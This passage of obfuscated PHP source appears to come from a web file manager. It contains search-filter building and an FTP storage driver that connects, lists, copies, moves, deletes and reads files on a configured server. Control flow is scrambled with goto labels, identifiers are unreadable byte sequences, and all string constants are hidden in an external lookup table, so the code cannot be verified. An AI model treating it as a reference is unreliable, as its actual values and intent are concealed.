strlen($f”ÒÚëğËì[$fí†âŒƒƒ[1760]]) < 2) { return; } goto Eïãª¢¥ª©; fæĞñÏ¿ Æ: foreach ($cÄÔˆÏ¨âÑ as $B“ÓŒÃƒ‡è => $E˜‚–¡×ù) { $FÏœä™ë§”[$fí†âŒƒƒ[1927] . $B“ÓŒÃƒ‡è] = $E˜‚–¡×ù; } foreach ($Cƒ§Õ±´ Œ as $b®§åòŸŠ) { $FÏœä™ë§”[] = array($fí†âŒƒƒ[1929] => $b®§åòŸŠ, $fí†âŒƒƒ[945] => $fí†âŒƒƒ[1764], array($fí†âŒƒƒ[1930] => $b®§åòŸŠ, $fí†âŒƒƒ[1931] => array($fí†âŒƒƒ[7], array($fí†âŒƒƒ[451], $fí†âŒƒƒ[450])))); } $this->join($b§½†êêñİ); goto FíËòöƒ„Æ; eİê›ŠÓÒç: } private function _parseSearchWhere($D‡°àĞ‘Å) { goto dº“¸Ãï„Ÿ; bÏ°‰ƒ•çç: if (isset($D‡°àĞ‘Å[$B©êÚˆƒÉ[483]]) && $D‡°àĞ‘Å[$B©êÚˆƒÉ[483]]) { $a¹åÙ ¹á¼ = array($B©êÚˆƒÉ[1933], $D‡°àĞ‘Å[$B©êÚˆƒÉ[483]]); if ($a…»£Óç«á[$B©êÚˆƒÉ[84]]) { $a…»£Óç«á[$B©êÚˆƒÉ[84]] = array($a…»£Óç«á[$B©êÚˆƒÉ[84]], $a¹åÙ ¹á¼, $B©êÚˆƒÉ[1934]); } else { $a…»£Óç«á[$B©êÚˆƒÉ[84]] = $a¹åÙ ¹á¼; } } if (isset($D‡°àĞ‘Å[$B©êÚˆƒÉ[1923]]) && $D‡°àĞ‘Å[$B©êÚˆƒÉ[1923]] > 0) { $a…»£Óç«á[$B©êÚˆƒÉ[78]] = array($B©êÚˆƒÉ[1932], $D‡°àĞ‘Å[$B©êÚˆƒÉ[1923]]); } if (isset($D‡°àĞ‘Å[$B©êÚˆƒÉ[1924]]) && $D‡°àĞ‘Å[$B©êÚˆƒÉ[1924]]) { $a¹åÙ ¹á¼ = array($B©êÚˆƒÉ[1933], $D‡°àĞ‘Å[$B©êÚˆƒÉ[1924]]); if ($a…»£Óç«á[$B©êÚˆƒÉ[78]]) { $a…»£Óç«á[$B©êÚˆƒÉ[78]] = array($a…»£Óç«á[$B©êÚˆƒÉ[78]], $a¹åÙ ¹á¼, $B©êÚˆƒÉ[1934]); } else { $a…»£Óç«á[$B©êÚˆƒÉ[78]] = $a¹åÙ ¹á¼; } } goto a¶±¤° Æ¿; a¶±¤° Æ¿: if (isset($D‡°àĞ‘Å[$B©êÚˆƒÉ[570]]) && $D‡°àĞ‘Å[$B©êÚˆƒÉ[570]]) { $a…»£Óç«á[] = array($B©êÚˆƒÉ[441] => $D‡°àĞ‘Å[$B©êÚˆƒÉ[570]], $B©êÚˆƒÉ[439] => $D‡°àĞ‘Å[$B©êÚˆƒÉ[570]], $B©êÚˆƒÉ[945] => $B©êÚˆƒÉ[1764]); } if (isset($D‡°àĞ‘Å[$B©êÚˆƒÉ[412]]) && $D‡°àĞ‘Å[$B©êÚˆƒÉ[412]]) { $DîàÁÊ¿À = $D‡°àĞ‘Å[$B©êÚˆƒÉ[412]]; if ($DîàÁÊ¿À == $B©êÚˆƒÉ[77]) { $a…»£Óç«á[$B©êÚˆƒÉ[410]] = 1; } else { if ($DîàÁÊ¿À == $B©êÚˆƒÉ[1935]) { $a…»£Óç«á[$B©êÚˆƒÉ[410]] = 0; } else { if ($DîàÁÊ¿À) { $DîàÁÊ¿À = is_array($DîàÁÊ¿À) ? $DîàÁÊ¿À : explode($B©êÚˆƒÉ[47], $DîàÁÊ¿À); $a…»£Óç«á[$B©êÚˆƒÉ[412]] = array($B©êÚˆƒÉ[418], $DîàÁÊ¿À); $a…»£Óç«á[$B©êÚˆƒÉ[410]] = 0; } } } } if (isset($D‡°àĞ‘Å[$B©êÚˆƒÉ[485]]) && $D‡°àĞ‘Å[$B©êÚˆƒÉ[485]]) { $Bâñ¢Üã = $this->sourceInfo($D‡°àĞ‘Å[$B©êÚˆƒÉ[485]]); $a…»£Óç«á[$B©êÚˆƒÉ[561]] = array($B©êÚˆƒÉ[520], $Bâñ¢Üã[$B©êÚˆƒÉ[494]] . $D‡°àĞ‘Å[$B©êÚˆƒÉ[485]] . $B©êÚˆƒÉ[521]); } goto d¬ÇŒÎËÉ¶; d¬ÇŒÎËÉ¶: if (isset($D‡°àĞ‘Å[$B©êÚˆƒÉ[1760]]) && trim($D‡°àĞ‘Å[$B©êÚˆƒÉ[1760]])) { $CÇÑÏˆÓ¯“ = trim($D‡°àĞ‘Å[$B©êÚˆƒÉ[1760]]); $CÇè§ó›ª  = explode($B©êÚˆƒÉ[50], $CÇÑÏˆÓ¯“); if (strlen($CÇÑÏˆÓ¯“) > 2 && (substr($CÇÑÏˆÓ¯“, 0, 1) == $B©êÚˆƒÉ[116] && substr($CÇÑÏˆÓ¯“, -1) == $B©êÚˆƒÉ[116]) || substr($CÇÑÏˆÓ¯“, 0, 1) == $B©êÚˆƒÉ[55] && substr($CÇÑÏˆÓ¯“, -1) == $B©êÚˆƒÉ[55]) { $CÇÑÏˆÓ¯“ = substr($CÇÑÏˆÓ¯“, 1, -1); $CÇè§ó›ª  = array($CÇÑÏˆÓ¯“); } $a…»£Óç«á[$B©êÚˆƒÉ[28]] = array(array($B©êÚˆƒÉ[520], $B©êÚˆƒÉ[1762] . $CÇÑÏˆÓ¯“ . $B©êÚˆƒÉ[1762])); if (count($CÇè§ó›ª ) > 1) { $a…»£Óç«á[$B©êÚˆƒÉ[28]] = array(); foreach ($CÇè§ó›ª  as $d£çÙŠ”) { if (!trim($d£çÙŠ”)) { continue; } $a…»£Óç«á[$B©êÚˆƒÉ[28]][] = array($B©êÚˆƒÉ[520], $B©êÚˆƒÉ[1762] . trim($d£çÙŠ”) . $B©êÚˆƒÉ[1762]); } } } return $a…»£Óç«á; goto F«ÄÃù…; dº“¸Ãï„Ÿ: $B©êÚˆƒÉ =& $_SERVER[Šº]; $a…»£Óç«á = array(); if (isset($D‡°àĞ‘Å[$B©êÚˆƒÉ[719]]) && $D‡°àĞ‘Å[$B©êÚˆƒÉ[719]]) { $a…»£Óç«á[$B©êÚˆƒÉ[84]] = array($B©êÚˆƒÉ[1932], $D‡°àĞ‘Å[$B©êÚˆƒÉ[719]]); } goto bÏ°‰ƒ•çç; F«ÄÃù…: } } goto e†¯†‚õ¿—; a¼ÙÕ–†¥¾: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($aİ½˜Úó¤‚) { parent::__construct(); if (count($aİ½˜Úó¤‚) > 0) { $this->_init($aİ½˜Úó¤‚); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($DÜŞ•ãœê) { $Aµ¬ö›Ò =& $_SERVER[Šº]; global $config; $this->appCharset = $config[$Aµ¬ö›Ò[1228]]; $this->systemCharset = $config[$Aµ¬ö›Ò[1229]]; if (isset($DÜŞ•ãœê[$Aµ¬ö›Ò[1230]]) && $DÜŞ•ãœê[$Aµ¬ö›Ò[1230]]) { $this->systemCharset = $DÜŞ•ãœê[$Aµ¬ö›Ò[1230]]; } } public function iconvApp($bÛ¹ØèÏª—) { return $this->iconvTo($bÛ¹ØèÏª—, $this->systemCharset, $this->appCharset); } public function iconvSystem($e‡»Í¥ëĞœ) { return $this->iconvTo($e‡»Í¥ëĞœ, $this->appCharset, $this->systemCharset); } public function getPathOuter($f»ÁÇ­áö) { goto BÖÒ£½¢‰; b’ÚËµÉ–: $f»ÁÇ­áö = KodIO::clear($f»ÁÇ­áö); $f»ÁÇ­áö = substr($f»ÁÇ­áö, strlen($cíØéÁ–›²)); if (empty($this->pathDriver)) { return $f»ÁÇ­áö; } goto EØã‡ÖÆ¦˜; EØã‡ÖÆ¦˜: return $this->pathDriver . $cÛºäÑ±Í[8] . ltrim($f»ÁÇ­áö, $cÛºäÑ±Í[8]); goto c•“¥™øç; Dà‚¥ñİ”: if (substr($cíØéÁ–›², 0, 2) == $cÛºäÑ±Í[1231]) { $cíØéÁ–›² = BASIC_PATH . substr($cíØéÁ–›², 2); } if (substr($f»ÁÇ­áö, 0, 2) == $cÛºäÑ±Í[1231]) { $f»ÁÇ­áö = BASIC_PATH . substr($f»ÁÇ­áö, 2); } $cíØéÁ–›² = KodIO::clear($cíØéÁ–›²); goto b’ÚËµÉ–; BÖÒ£½¢‰: $cÛºäÑ±Í =& $_SERVER[Šº]; $cíØéÁ–›² = $this->iconvApp($this->pathBase); $f»ÁÇ­áö = $this->iconvApp($f»ÁÇ­áö); goto Dà‚¥ñİ”; c•“¥™øç: } private function _init($E£Ä–‹ö  = array()) { $d¢Ó‡¿½¼Ñ =& $_SERVER[Šº]; if (!function_exists($d¢Ó‡¿½¼Ñ[1232])) { throw new Exception(LNG($d¢Ó‡¿½¼Ñ[1233])); } $this->config = $E£Ä–‹ö ; $this->charsetReset($E£Ä–‹ö ); foreach ($E£Ä–‹ö  as $aÔ—«î‡ƒÜ => $bŞÌ¸Æ¼±•) { if (isset($this->{$aÔ—«î‡ƒÜ})) { $this->{$aÔ—«î‡ƒÜ} = $bŞÌ¸Æ¼±•; } } return $this->_login($E£Ä–‹ö ); } private function _login($eêá©Ûßİ) { goto aÎ÷‚…ŸÇ; FŠ„ËÔ‹—µ: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $eë†‡¤çğŒ = $this->pasv == $EùÇ¿È¶ƒ‹[87] ? !0 : !1; @ftp_pasv($this->connect, $eë†‡¤çğŒ); goto c”êŸŠç; aÎ÷‚…ŸÇ: $EùÇ¿È¶ƒ‹ =& $_SERVER[Šº]; static $fƒˆİ‚è² = array(); $A¶æãÍó‚ì = md5(json_encode($eêá©Ûßİ)); goto dÍš¬‘ğğ; a¾¼ÉÏ´Ÿ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $BÁçÌ†Ì¶Œ = @ftp_login($this->connect, $this->username, $this->userpass); goto FŠ„ËÔ‹—µ; dÍš¬‘ğğ: if (isset($fƒˆİ‚è²[$A¶æãÍó‚ì])) { foreach ($fƒˆİ‚è²[$A¶æãÍó‚ì] as $EŠùóÄğ => $e‹ù‚ø¦©) { $this->{$EŠùóÄğ} = $e‹ù‚ø¦©; } return !0; } $C£Ìøœğé  = parse_url(trim($this->server, $EùÇ¿È¶ƒ‹[8])); $this->host = $C£Ìøœğé [$EùÇ¿È¶ƒ‹[175]]; goto fíÏã¤ƒº; fíÏã¤ƒº: $BÛ’ÂÜéó = isset($C£Ìøœğé [$EùÇ¿È¶ƒ‹[174]]) && $C£Ìøœğé [$EùÇ¿È¶ƒ‹[174]] == $EùÇ¿È¶ƒ‹[1234] ? !0 : !1; $this->scheme = $BÛ’ÂÜéó ? $EùÇ¿È¶ƒ‹[1235] : $EùÇ¿È¶ƒ‹[1236]; $this->port = isset($C£Ìøœğé [$EùÇ¿È¶ƒ‹[176]]) ? $C£Ìøœğé [$EùÇ¿È¶ƒ‹[176]] : 21; goto a¾¼ÉÏ´Ÿ; c”êŸŠç: $fƒˆİ‚è²[$A¶æãÍó‚ì] = array($EùÇ¿È¶ƒ‹[1237] => $this->connect, $EùÇ¿È¶ƒ‹[175] => $this->host, $EùÇ¿È¶ƒ‹[174] => $this->scheme, $EùÇ¿È¶ƒ‹[176] => $this->port); return $BÁçÌ†Ì¶Œ; goto aôí«÷¶; aôí«÷¶: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($bÅ«‘ôà¯Ì, $F¡Å«¬¥˜ã = '', $eÅŒšĞòÆ¸ = REPEAT_RENAME) { if ($this->setContent($bÅ«‘ôà¯Ì, $F¡Å«¬¥˜ã)) { return $this->getPathOuter($bÅ«‘ôà¯Ì); } return !1; } public function mkdir($B›Üæ´Ú’Õ, $fĞò´ôó•É = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $B›Üæ´Ú’Õ = $this->iconvSystem($B›Üæ´Ú’Õ); if ($this->_isFolder($B›Üæ´Ú’Õ) || @ftp_mkdir($this->connect, $B›Üæ´Ú’Õ)) { return $this->getPathOuter($B›Üæ´Ú’Õ); } if (!$this->mkdir($this->pathFather($B›Üæ´Ú’Õ))) { return !1; } if ($B›Üæ´Ú’Õ = @ftp_mkdir($this->connect, $B›Üæ´Ú’Õ)) { return $this->getPathOuter($B›Üæ´Ú’Õ); } return !1; } public function copyFile($bäƒ‹ÄĞ¿ˆ, $cÛ«¾êÔëí) { goto dÕŒ©Â„í; d¢Æ»Í§¬: $E¼óëšÀ§· = $this->iconvApp($d°‡”í¸î); $this->download($bäƒ‹ÄĞ¿ˆ, $E¼óëšÀ§·); $Eªß™İªä‚ = $this->upload($cÛ«¾êÔëí, $E¼óëšÀ§·); goto EáÈÉôŠÀš; EáÈÉôŠÀš: $this->tempFileRemve($d°‡”í¸î); return $Eªß™İªä‚; goto cö‹á¥£²Œ; dÕŒ©Â„í: if (!$this->_isconn()) { return !1; } $Cö¾ÑùÉ = $this->pathThis($this->iconvSystem($bäƒ‹ÄĞ¿ˆ)); $d°‡”í¸î = $this->tempFile($Cö¾ÑùÉ); goto d¢Æ»Í§¬; cö‹á¥£²Œ: } public function moveFile($Cİ©ÒÂ©®À, $F®ø†¾ß™…) { if (!$this->_isconn()) { return !1; } $Cİ©ÒÂ©®À = $this->iconvSystem($Cİ©ÒÂ©®À); $F®ø†¾ß™… = $this->iconvSystem($F®ø†¾ß™…); $dëƒ²ºß¼ = @ftp_rename($this->connect, $Cİ©ÒÂ©®À, $F®ø†¾ß™…); return $dëƒ²ºß¼ ? $this->getPathOuter($F®ø†¾ß™…) : !1; } public function delFile($eŞáïù ¶©) { if (!$this->_isconn()) { return !1; } $eŞáïù ¶© = $this->iconvSystem($eŞáïù ¶©); return @ftp_delete($this->connect, $eŞáïù ¶©); } public function delFolder($A›æòÍ) { goto cÉ•ÕÜÑĞ•; bæ•ª‘Ş…: $this->fileList($A›æòÍ, $bâà¤óÕï‡, $cÒÕ‚óô—, !0); $this->listItemCache = !0; foreach ($cÒÕ‚óô— as $A¹«–‰ôç) { $d˜£Õ¹ÄÕì = $this->iconvSystem($A¹«–‰ôç[$_SERVER[Šº][28]]); $bİÙ‡Ã¡ = @ftp_delete($this->connect, $d˜£Õ¹ÄÕì); if (!$bİÙ‡Ã¡) { return !1; } } goto CƒÑÆ…¨”; cÉ•ÕÜÑĞ•: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $bâà¤óÕï‡ = $cÒÕ‚óô— = array(); goto bæ•ª‘Ş…; CƒÑÆ…¨”: foreach ($bâà¤óÕï‡ as $d˜£Õ¹ÄÕì) { $d˜£Õ¹ÄÕì = $this->iconvSystem($d˜£Õ¹ÄÕì); $bİÙ‡Ã¡ = @ftp_rmdir($this->connect, $d˜£Õ¹ÄÕì); if (!$bİÙ‡Ã¡) { return !1; } } $A›æòÍ = $this->iconvSystem($A›æòÍ); return @ftp_rmdir($this->connect, $A›æòÍ); goto d«‚ˆŠÄÒ¸; d«‚ˆŠÄÒ¸: } public function rename($A¸¼çí, $BàÙÇìê½Ü) { goto Eö‘ÔÒÀ©; DÓ—Ì³–Ïº: return $bÄ„¦µ’½ ? $this->getPathOuter($c…Œˆ…‡Ò‚) : !1; goto C¡Âñ±¹‹; aòÜªªìÃ: $c…Œˆ…‡Ò‚ = rtrim($B×ª´ÊÜ, $bÏ›Æ³£ó“[8]) . $bÏ›Æ³£ó“[8] . $aøÂ®òŸÅ‘; $bÄ„¦µ’½ = @ftp_rename($this->connect, $A¸¼çí, $c…Œˆ…‡Ò‚); $c…Œˆ…‡Ò‚ = $this->iconvApp($c…Œˆ…‡Ò‚); goto DÓ—Ì³–Ïº; Eö‘ÔÒÀ©: $bÏ›Æ³£ó“ =& $_SERVER[Šº]; if (!$this->_isconn()) { return !1; } $aøÂ®òŸÅ‘ = $this->fileNameAuto($this->pathFather($A¸¼çí), $BàÙÇìê½Ü); goto aÒÉ‚ñò±; aÒÉ‚ñò±: $aøÂ®òŸÅ‘ = $this->iconvSystem($aøÂ®òŸÅ‘); $A¸¼çí = $this->iconvSystem($A¸¼çí); $B×ª´ÊÜ = $this->pathFather($A¸¼çí); goto aòÜªªìÃ; C¡Âñ±¹‹: } private function folderInfo($EõŠªÈòÌ‡, $fˆ¡ÜÕ¯ì = false) { $D’‹ø¨š­¥ =& $_SERVER[Šº]; $e×˜Ÿ¶®Áö = array($D’‹ø¨š­¥[28] => $this->pathThis($EõŠªÈòÌ‡), $D’‹ø¨š­¥[76] => $this->getPathOuter($D’‹ø¨š­¥[8] . $EõŠªÈòÌ‡), $D’‹ø¨š­¥[29] => $D’‹ø¨š­¥[77]); if ($fˆ¡ÜÕ¯ì) { return $e×˜Ÿ¶®Áö; } $e×˜Ÿ¶®Áö[$D’‹ø¨š­¥[193]] = $e×˜Ÿ¶®Áö[$D’‹ø¨š­¥[84]] = 0; $e×˜Ÿ¶®Áö[$D’‹ø¨š­¥[194]] = $e×˜Ÿ¶®Áö[$D’‹ø¨š­¥[195]] = !0; return $e×˜Ÿ¶®Áö; } private function fileInfo($aÉÁÚĞ“´ø, $cß³ÕºÁ‡ = false, $E×êù‹ê¾ = array()) { goto bíë…É’³; EªéŒšãÓØ: return $bÇƒœ—ù’; goto b×ÀĞÄµ‘»; bíë…É’³: $dÍ²–ä‰­ =& $_SERVER[Šº]; $bÇƒœ—ù’ = array($dÍ²–ä‰­[28] => $this->pathThis($aÉÁÚĞ“´ø), $dÍ²–ä‰­[76] => $this->getPathOuter($dÍ²–ä‰­[8] . $aÉÁÚĞ“´ø), $dÍ²–ä‰­[29] => $dÍ²–ä‰­[192], $dÍ²–ä‰­[78] => isset($E×êù‹ê¾[$dÍ²–ä‰­[78]]) ? $E×êù‹ê¾[$dÍ²–ä‰­[78]] : 0, $dÍ²–ä‰­[168] => $this->ext($aÉÁÚĞ“´ø)); if ($cß³ÕºÁ‡) { return $bÇƒœ—ù’; } goto a…íò§¦ˆõ; a…íò§¦ˆõ: $bÇƒœ—ù’[$dÍ²–ä‰­[193]] = $bÇƒœ—ù’[$dÍ²–ä‰­[84]] = 0; $bÇƒœ—ù’[$dÍ²–ä‰­[194]] = $bÇƒœ—ù’[$dÍ²–ä‰­[195]] = !0; $fÓÙõÚñ’ø = $this->iconvSystem($aÉÁÚĞ“´ø); goto Cğã£—ºÇÛ; Cğã£—ºÇÛ: $bÇƒœ—ù’[$dÍ²–ä‰­[84]] = @ftp_mdtm($this->connect, $fÓÙõÚñ’ø); if (empty($E×êù‹ê¾)) { $E×êù‹ê¾ = $this->objectMeta($aÉÁÚĞ“´ø); if (!$E×êù‹ê¾) { return $bÇƒœ—ù’; } } $bÇƒœ—ù’[$dÍ²–ä‰­[78]] = $E×êù‹ê¾[$dÍ²–ä‰­[78]]; goto EªéŒšãÓØ; b×ÀĞÄµ‘»: } public function size($Cæöô£•õÛ) { $c¿¬«éˆ”Á = $this->objectMeta($Cæöô£•õÛ); return $c¿¬«éˆ”Á ? $c¿¬«éˆ”Á[$_SERVER[Šº][78]] : 0; } public function info($aÎ§´ƒìô) { if ($this->isFile($aÎ§´ƒìô)) { return $this->fileInfo($aÎ§´ƒìô, 0); } else { if ($this->isFolder($aÎ§´ƒìô)) { return $this->folderInfo($aÎ§´ƒìô); } } return !1; } private function fileList($Aªà»¢Æâ, &$B­ÕÛö®ª, &$bÖòÏ¶Î, $Bğ˜’ÚÕ×« = false) { goto bêÛ±šæå’; bêÛ±šæå’: $C»‹ñĞĞêã =& $_SERVER[Šº]; $Aªà»¢Æâ = $this->iconvSystem($Aªà»¢Æâ); if (!$this->isFolder($Aªà»¢Æâ)) { return !1; } goto a—°ò›È¬º; a—°ò›È¬º: @ftp_chdir($this->connect, $C»‹ñĞĞêã[8]); $Aªà»¢Æâ = rtrim($Aªà»¢Æâ, $C»‹ñĞĞêã[8]) . $C»‹ñĞĞêã[8]; check_abort(); goto F±ˆ±Ÿãë; bß‡ÏœŒÜ: $C…Ï·Õµ‡¼ = array($C»‹ñĞĞêã[95] => 1, $C»‹ñĞĞêã[1238] => 1); foreach ($d‰è­ÅƒÁç as $C§­—ÕÓË¥) { goto bïª‚ùö¯‹; eˆ¿—ÊÊÈµ: if ($añòİ³èÅ) { $B­ÕÛö®ª[] = $dóéŸŞ×½÷; if ($Bğ˜’ÚÕ×«) { $this->fileList($dóéŸŞ×½÷, $B­ÕÛö®ª, $bÖòÏ¶Î, $Bğ˜’ÚÕ×«); } continue; } $bÖòÏ¶Î[] = $Dî¼ƒ°Ğæø; goto EÜ°İø–Ìô; D¿‚ë¼ƒ¶Í: if (substr($C§­—ÕÓË¥, 0, 1) == $C»‹ñĞĞêã[1239]) { $Dî¼ƒ°Ğæø[$C»‹ñĞĞêã[29]] = $C»‹ñĞĞêã[77]; $Dî¼ƒ°Ğæø[$C»‹ñĞĞêã[78]] = 0; } $añòİ³èÅ = $Dî¼ƒ°Ğæø[$C»‹ñĞĞêã[29]] == $C»‹ñĞĞêã[77] ? !0 : !1; if ($Dæšäé¾) { $this->cacheMethod($C»‹ñĞĞêã[198], $dóéŸŞ×½÷, $añòİ³èÅ); $this->cacheMethod($C»‹ñĞĞêã[199], $dóéŸŞ×½÷, $Dî¼ƒ°Ğæø); } goto eˆ¿—ÊÊÈµ; bïª‚ùö¯‹: $d†›ÄŠÈ¿î = $this->_listItem($C§­—ÕÓË¥); if ($d†›ÄŠÈ¿î[0] == $C»‹ñĞĞêã[717]) { continue; } $dóéŸŞ×½÷ = $d†›ÄŠÈ¿î[8]; goto b¶”êïé„¸; b¶”êïé„¸: if (!$dóéŸŞ×½÷ || isset($C…Ï·Õµ‡¼[$dóéŸŞ×½÷])) { continue; } $dóéŸŞ×½÷ = $this->iconvApp($Aªà»¢Æâ . ltrim($dóéŸŞ×½÷, $C»‹ñĞĞêã[8])); $Dî¼ƒ°Ğæø = array($C»‹ñĞĞêã[28] => $dóéŸŞ×½÷, $C»‹ñĞĞêã[29] => $C»‹ñĞĞêã[192], $C»‹ñĞĞêã[78] => $d†›ÄŠÈ¿î[4]); goto D¿‚ë¼ƒ¶Í; EÜ°İø–Ìô: } if ($Dæšäé¾) { $this->cacheMethod($C»‹ñĞĞêã[198], $Aªà»¢Æâ, !0); } goto F£Ò¯„ÑËÄ; F±ˆ±Ÿãë: $Dæšäé¾ = $this->listItemCache === !1 ? !1 : !0; $d‰è­ÅƒÁç = @ftp_rawlist($this->connect, $Aªà»¢Æâ); if (!$d‰è­ÅƒÁç) { $d‰è­ÅƒÁç = array(); } goto bß‡ÏœŒÜ; F£Ò¯„ÑËÄ: } private function _listItem($C£İÜŞ¡¸¬) { if (empty($C£İÜŞ¡¸¬)) { return array(); } $e‘Ô¶½†ÙÜ = preg_split($_SERVER[Šº][1240], $C£İÜŞ¡¸¬); if (count($e‘Ô¶½†ÙÜ) <= 9) { return $e‘Ô¶½†ÙÜ; } $e‘Ô¶½†ÙÜ[8] = trim(substr($C£İÜŞ¡¸¬, strpos($C£İÜŞ¡¸¬, $e‘Ô¶½†ÙÜ[7]) + strlen($e‘Ô¶½†ÙÜ[7]))); return array_splice($e‘Ô¶½†ÙÜ, 0, 9); } public function listPath($døç‘Ş©×, $FßŠÕ‹›ä· = false) { goto CŸŒ§‡É»Â; aÑƒ”Ø¯õÈ: $this->fileList($døç‘Ş©×, $c—Î«İ©, $dÃ†—¡ñ¥); foreach ($c—Î«İ© as $e‚Å¼Ëï¶ => $aæíÁ…¾Š) { $c—Î«İ©[$e‚Å¼Ëï¶] = $this->folderInfo($aæíÁ…¾Š, $FßŠÕ‹›ä·); } foreach ($dÃ†—¡ñ¥ as $e‚Å¼Ëï¶ => $aæíÁ…¾Š) { $dÃ†—¡ñ¥[$e‚Å¼Ëï¶] = $this->fileInfo($aæíÁ…¾Š[$AŠ”ƒ±á¸ã[28]], $FßŠÕ‹›ä·, $aæíÁ…¾Š); } goto a©î«çƒ‰Ñ; a©î«çƒ‰Ñ: return array($AŠ”ƒ±á¸ã[75] => $c—Î«İ©, $AŠ”ƒ±á¸ã[74] => $dÃ†—¡ñ¥); goto Aôñ•¤³Òù; CŸŒ§‡É»Â: $AŠ”ƒ±á¸ã =& $_SERVER[Šº]; if (!$this->_isconn()) { return !1; } $c—Î«İ© = $dÃ†—¡ñ¥ = array(); goto aÑƒ”Ø¯õÈ; Aôñ•¤³Òù: } public function has($fš“ºØ‹³È, $c©Ä©Ñî‹ö = false, $Bµ‡–·¬ôƒ = true) { goto AÆœÜªå˜; fÌ‘ì¸ÜŒ: return !1; goto E°Ìå¤­Æ; AÆœÜªå˜: $Eˆîœ­·‘ø =& $_SERVER[Šº]; $dŠÀº«×Š = $FÉ’õÄ²®ê = array(); $f„¦Õ¥ÊùÃ = $c©Ä©Ñî‹ö ? !0 : !1; goto dñ¦‘Ö¥³±; dñ¦‘Ö¥³±: $this->fileList($fš“ºØ‹³È, $dŠÀº«×Š, $FÉ’õÄ²®ê, $f„¦Õ¥ÊùÃ); if ($c©Ä©Ñî‹ö) { return array($Eˆîœ­·‘ø[202] => count($FÉ’õÄ²®ê), $Eˆîœ­·‘ø[203] => count($dŠÀº«×Š)); } if ($Bµ‡–·¬ôƒ) { if (count($FÉ’õÄ²®ê)) { return !0; } } else { if (count($dŠÀº«×Š)) { return !0; } } goto fÌ‘ì¸ÜŒ; E°Ìå¤­Æ: } public function listAll($b‡Øí²¿´É) { goto f÷¦ìé™ê; aÒ˜”¾³ÈÇ: foreach ($bº³ŠÆ ìÅ as $BƒÅô–ÓÕÊ) { if (is_string($BƒÅô–ÓÕÊ)) { $Dßê…Öí‚[$BƒÅô–ÓÕÊ] = 0; } } return $this->listAllFiles($b‡Øí²¿´É, array_keys($Dßê…Öí‚), $Dßê…Öí‚); goto b­óÅÌã§; f÷¦ìé™ê: $EØË¶†Œ™ =& $_SERVER[Šº]; if (!$this->_isconn()) { return !1; } $bº³ŠÆ ìÅ = $EØçèò«Ÿ› = array(); goto dùù‹Œš¾ù; dùù‹Œš¾ù: $this->fileList($b‡Øí²¿´É, $bº³ŠÆ ìÅ, $EØçèò«Ÿ›, !0); $Dßê…Öí‚ = array(); foreach ($EØçèò«Ÿ› as $BƒÅô–ÓÕÊ) { $Dßê…Öí‚[$BƒÅô–ÓÕÊ[$EØË¶†Œ™[28]]] = $BƒÅô–ÓÕÊ[$EØË¶†Œ™[78]]; } goto aÒ˜”¾³ÈÇ; b­óÅÌã§: } public function getContent($F²öã¼¥Åš) { if (!$this->_isconn()) { return !1; } $F²öã¼¥Åš = $this->iconvSystem($F²öã¼¥Åš); return $this->fileSubstr($F²öã¼¥Åš); } public function setContent($cëÅ»¬ßŒ¦, $a¨¤«Ë«Ô = '') { goto Bœ™×ƒ„óÍ; Bœ™×ƒ„óÍ: if (!$this->_isconn()) { return !1; } $Dêõå“ÃŠ = $this->pathThis($this->iconvSystem($cëÅ»¬ßŒ¦)); $Cî¶ç‚†öœ = $this->tempFile($Dêõå“ÃŠ); goto BÖ—á±£±­; BÖ—á±£±­: file_put_contents($Cî¶ç‚†öœ, $a¨¤«Ë«Ô); $e…¯š°á˜è = $this->upload($cëÅ»¬ßŒ¦, $this->iconvApp($Cî¶ç‚†öœ)); $this->tempFileRemve($Cî¶ç‚†öœ); goto dª¢ØÍ·©¶; dª¢ØÍ·©¶: return $e…¯š°á˜è; goto bŞí‰­¨ÈÁ; bŞí‰­¨ÈÁ: } public function fileSubstr($dŞÂ°×¡Â, $AÅ²Ó¤×ÖÂ = 0, $A­•®ê“Š“ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($dŞÂ°×¡Â, $AÅ²Ó¤×ÖÂ, $A­•®ê“Š“); } private function ftpRequest($aõäŠê‚„, $e‘©¨İ§† = 0, $bå—Å¾šÂ» = false) { goto D©Ä˜ÎÇë; D©Ä˜ÎÇë: $aõäŠê‚„ = $this->iconvSystem($aõäŠê‚„); $E«¢’Š•Û‚ = $this->scheme . $this->host . $_SERVER[Šº][4] . $this->port; $B„ó™ïŠã = curl_init(); goto F„Ö›õêòŞ; dàÌÓˆ¶: return $a„õ–ÒŠÅÄ; goto aìˆÜ†Ú®š; EË²“‚©Ëå: curl_setopt($B„ó™ïŠã, CURLOPT_RETURNTRANSFER, 1); $a„õ–ÒŠÅÄ = curl_exec($B„ó™ïŠã); curl_close($B„ó™ïŠã); goto dàÌÓˆ¶; F„Ö›õêòŞ: curl_setopt($B„ó™ïŠã, CURLOPT_URL, $E«¢’Š•Û‚ . $this->pathEncode($aõäŠê‚„)); curl_setopt($B„ó™ïŠã, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($bå—Å¾šÂ») { $fË¼÷±­ºõ = $e‘©¨İ§† + $bå—Å¾šÂ» - 1; curl_setopt($B„ó™ïŠã, CURLOPT_RANGE, "{$e‘©¨İ§†}\x2d{$fË¼÷±­ºõ}"); } goto EË²“‚©Ëå; aìˆÜ†Ú®š: } public function upload($dã¨Œ‰‹ğõ, $fÌšî»©í•, $e©ŒÜ¾±ˆ = false, $E³Ğ•›“×İ = REPEAT_REPLACE) { goto bõšòÀÔÕğ; Dö¸Ü çØŒ: if ($EØºâ¸Íêò != FTP_FINISHED) { return !1; } return $this->getPathOuter($dã¨Œ‰‹ğõ); goto EÆŞ¥ÕŒ‰†; bõšòÀÔÕğ: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($dã¨Œ‰‹ğõ))) { return !1; } $dã¨Œ‰‹ğõ = 